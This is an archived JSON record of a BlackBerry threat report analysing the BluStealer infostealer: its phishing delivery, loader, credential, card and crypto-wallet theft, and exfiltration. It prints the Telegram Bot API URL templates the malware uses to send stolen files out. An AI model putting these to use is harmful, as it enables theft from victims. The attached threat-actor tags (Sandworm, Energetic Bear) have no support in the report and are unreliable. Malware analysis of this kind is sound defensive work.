{
    "id": "543ebb56-4125-484d-b4aa-ed27cc2cf66e",
    "created_at": "2023-01-12T15:10:41.888667Z",
    "updated_at": "2025-03-27T02:14:39.276282Z",
    "deleted_at": null,
    "sha1_hash": "a5aa6605c254abe77c26bafb3fadd8fe6acc3053",
    "title": "2021-10-07 - Threat Thursday- BluStealer Infostealer",
    "authors": "",
    "file_creation_date": "2022-05-28T23:16:31Z",
    "file_modification_date": "2022-05-28T23:16:31Z",
    "file_size": 3743969,
    "plain_text": "# Threat Thursday: BluStealer Infostealer\n\n**[blogs.blackberry.com/en/2021/10/threat-thursday-blustealer-infostealer](https://blogs.blackberry.com/en/2021/10/threat-thursday-blustealer-infostealer)**\n\nThe BlackBerry Research & Intelligence Team\n\nBluStealer is a new information-stealing malware that contains the functionality to steal\nlogin credentials, credit card data, cryptocurrency and more. This harvested data is returned\nto the attacker via SMTP and the Telegram Bot API.\n\nThe malware consists of a loader built in Visual Basic®, which is used to load open-source\n.NET assembly hack tools such as ChromeRecovery and ThunderFox. The payloads\ncontained within the loader vary from sample to sample, which highlights the malware\nauthor’s ability to customize each component separately.\n\n### Operating System\n\n Risk and Impact\n\n\n-----\n\n### Technical Analysis\n\n**Infection Vector**\n\nBluStealer has been observed spreading through malspam campaigns. Attackers using\nBluStealer have also made malicious email samples available on online forums. The emails\nmasquerade as coming from legitimate organizations to trick the victim. The samples\ninclude .iso attachments, as well as download URLs.\n\nThe received messages urge the victims to immediately open and fill out their details to\nrectify whatever “issue” it is they state has occurred. Typically, these will be something like a\nmissed delivery, or shipping fee due. The email attachments/download URLs contain\nthe.NET Loader, which loads the malicious payloads.\n\n**Loader**\n\nThe initial sample used for analysis in this post is a Windows Installation (ISO) file which\nwas delivered as part of a malicious email campaign as mentioned above.\n\nContained within the ISO file is a 32-bit Windows® executable. The file is Visual Basic 6\ncompiled, and highly encrypted. The file is called “Your DHL Shipment Notification.pdf.exe.”\nThis naming convention is used to lure the victim into clicking the malicious executable.\n\n_Figure 1 - BluStealer VB compiled loader_\n\nThe sample contains a resource section (which is typically named “.rsrc”) that is unusually\nlarge. Typically, the .rsrc section contains the resources used by the executable, such as\nicons, images and menus. Malware also uses this section to embed arbitrary data, such as\nexecutable files. This suggests this file is likely a loader. This section also has very high\nentropy, which is indicative of the file being encrypted.\n\n\n-----\n\nBluStealer contains anti-VM (virtual machine) techniques that help the threat remain\nundetected and impede analysis, as security researchers often use this technology to safely\ntest threats. The malware will check the System32 WMI class to check for the presence of a\nvirtual machine. The list of VMs it searches for includes VMware Virtual Platform and Virtual\nBox. If the presence of a VM is detected on the infected machine, then the process\nexecution will be stopped.\n\nLooking at the sample in debugging software OllyDbg reveals some of the functionality\ncontained within the PE file, as well as the modules the malware loads. Here we can see\ninitial evidence that the malware contains keylogging, screen recording and crypto stealing\nfunctionality.\n\nFigure 2 - OllyDbg showcasing functionality and modules\n\nThe loader decrypts the payloads stored in the resource section using an AES algorithm\nencryption key. The command line utility “AppLaunch.exe” is then executed to launch the\n.NET executable’s first payload.\n\n**ChromeRecovery Stealing Module**\n\nThe .NET executable “sdedffggdg.exe’ is dropped to the directory\n“User/AppData/Microsoft/Windows/Templates.\"\n\nFigure 3 - 'sdedffggdg.exe'\n\nThis file’s internal name is “ChromeRecovery.exe” – it is the core stealing module of\nBluStealer. The file is a 32-bit .NET executable.\n\n\n-----\n\nFigure 4 - Loaded module is called “ChromeRecovery”\n\nChromeRecovery begins by scanning the infected machines for any potential login\ncredentials for web browsers, FTP clients and email clients. In the screenshot below, the\nmalware can be seen searching through the directories of various well known web\nbrowsers, including Chrome™ and Opera.\n\n\n-----\n\n_Figure 5 - ChromeRecovery stealing module harvesting data_\n\nAll targeted web browsers are as follows.\n\nAnalyzing the module with debugger and .NET assembly editor dnSpy, we can see the\nformatting of the stolen credentials.\n\n\n-----\n\nFigure 6 - Stolen credentials formatting\n\nChromeRecovery also performs a fingerprint of the victim’s system, gathering information\nthat can be seen below. This includes Windows Version, AV Information, CPU Name, GPU\nName, RAM Amount, Public and Local IP Address and location.\n\nFigure 7 - System fingerprinting\n\nBluStealer writes all its stolen data, including passwords, to a file called “credentials.txt.”\n\n\n-----\n\nWithin the resource section of ChromeRecovery.exe is an additional 32-Bit .NET file called\n“ConsoleApp8.exe.” This file is used to steal credit card information from the targeted\nmachine.\n\nFigure 8 - Credit card details harvested by 'ConsoleApp8.exe'\n\n**ThunderFox Stealing Module**\n\nWhen ChromeRecovery has finished execution, the main loader loads its second PE\nmodule from the resource section into memory and decrypts it. This results in another 32-bit\n.NET assembly file called “ThunderFox.exe” being dropped.\n\nThunderFox targets Mozilla® products, which can be seen in the screenshot below. It also\nextracts login credentials from the following directories: logins.json, signons.sqlite, key4.db,\nkey3.db, cert9.db, and cert8.db.\n\nAs with ChromeRecovery, this harvested data is stored in the “credentials.txt,” using the\nsame format.\n\n\n-----\n\nFigure 9 - ThunderFox Commands\n\n**Cryptocurrency Stealing**\n\nThe core section of BluStealer, which is built in Visual Basic, performs the cryptocurrencystealing functionality by scanning the victim’s machine for any folders containing\ncryptocurrency. The crypto wallets that are targeted include Zcash, Armory, Bytecoin, Jaxx\nLiberty, Exodus, Ethereum, Electrum, Guarda and Coinomi.\n\n**Data Exfiltration**\n\nBluStealer exfiltrates all the data it’s gathered into “credentials.txt” through Simple Mail\nTransfer Protocol (SMTP) and the Telegram Bot API. This API is an HTTP-based interface\ncreated for developers. It allows the attacker to interact with their bot through a web\nbrowser by issuing commands.\n\nThe Telegram API commands utilized to exfiltrate data via this method are as follows.\n\nhttps://api.telegram.org/bot<your-bot-token>/sendMessage?chat_id=<your-chatid>&text=<your-message>\nhttps://api.telegram.org/bot<your-bot-token>/sendDocument?chat_id=<your-channelid>&caption=<your-caption>\n\n\n-----\n\n**Conclusion**\n\nThe flexible nature of BluStealer means that this malware family can cause damage to both\nenterprise devices as well as personal devices. In its current state, BluStealer appears to be\naimed toward targeting individuals and their personal computers. The malware goes after\nbrowser credentials, FTP applications, credit card details, and personal crypto wallets.\nCrypto wallets contain data that people are less likely to store on their work device.\n\nBut this does not mean BluStealer couldn’t cause a lot of damage on an enterprise system.\nThe malware’s evasiveness and credential-stealing functionality could be used by a\nsuccessful threat actor to carve out important information and data from corporate devices\nbefore exfiltrating them.\n\n### YARA Rule\n\nThe following YARA rule was authored by the BlackBerry Threat Research Team to catch\nthe threat described in this document:\n\n\n-----\n\n### Indicators of Compromise (IoCs)\n\n\n-----\n\n### BlackBerry Assistance\n\nIf you’re battling this malware or a similar threat, you’ve come to the right place, regardless\nof your existing BlackBerry relationship.\n\n[The BlackBerry Incident Response team is made up of world-class consultants dedicated to](https://www.blackberry.com/us/en/services/incident-response)\nhandling response and containment services for a wide range of incidents, including\nransomware and Advanced Persistent Threat (APT) cases.\n\nWe have a global consulting team standing by to assist you, providing around-the-clock\nsupport, where required, as well as local assistance. Please contact us here:\nhttps://www.blackberry.com/us/en/forms/cylance/handraiser/emergency-incident-responsecontainment\n\n_Want to learn more about cyber threat hunting? Check out the BlackBerry Research &_\n_Intelligence Team’s new book,_ _Finding Beacons in the Dark: A Guide to Cyber Threat_\n_Intelligence - now available for pre-order_\n\n**_here._**\n\n\n-----\n\n## About The BlackBerry Research & Intelligence Team\n\nThe BlackBerry Research & Intelligence team examines emerging and persistent threats,\nproviding intelligence analysis for the benefit of defenders and the organizations they serve.\n\nBack\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-07 - Threat Thursday- BluStealer Infostealer.pdf"
    ],
    "report_names": [
        "2021-10-07 - Threat Thursday- BluStealer Infostealer.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536241,
    "ts_updated_at": 1743041679,
    "ts_creation_date": 1653779791,
    "ts_modification_date": 1653779791,
    "files": {
        "pdf": "https://archive.orkl.eu/a5aa6605c254abe77c26bafb3fadd8fe6acc3053.pdf",
        "text": "https://archive.orkl.eu/a5aa6605c254abe77c26bafb3fadd8fe6acc3053.txt",
        "img": "https://archive.orkl.eu/a5aa6605c254abe77c26bafb3fadd8fe6acc3053.jpg"
    }
}